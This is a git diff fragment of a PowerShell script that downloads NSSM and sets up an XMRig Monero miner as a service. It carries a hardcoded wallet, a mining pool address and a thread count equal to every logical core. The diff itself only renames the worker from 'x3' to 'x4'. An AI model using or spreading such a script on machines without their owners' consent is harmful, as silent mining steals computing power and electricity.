@@ -13,7 +13,7 @@ Invoke-WebRequest -Uri $nssmZipUrl -OutFile $nssmZipPath -UseBasicParsing
 Expand-Archive -Path $nssmZipPath -DestinationPath $xmrigFolder -Force
 $nssmExe = Get-ChildItem -Path $xmrigFolder -Recurse -Filter "nssm.exe" | Where-Object { $_.DirectoryName -like "*win64*" } | Select-Object -First 1 -ExpandProperty FullName
 $wallet = "87LVyXpW64PLompVtz6nYsULGAGckEv63CGW8euYg21VV7BB8sALsvadF1JK7E6g5VV71gJSXJcBrPEJjpjwhbX5HBUCc5s"
-$worker = "x3"
+$worker = "x4"
 $threads = (Get-CimInstance Win32_Processor).NumberOfLogicalProcessors
 $appParams = "-o pool.hashvault.pro:443 " +
              "-u $wallet " +
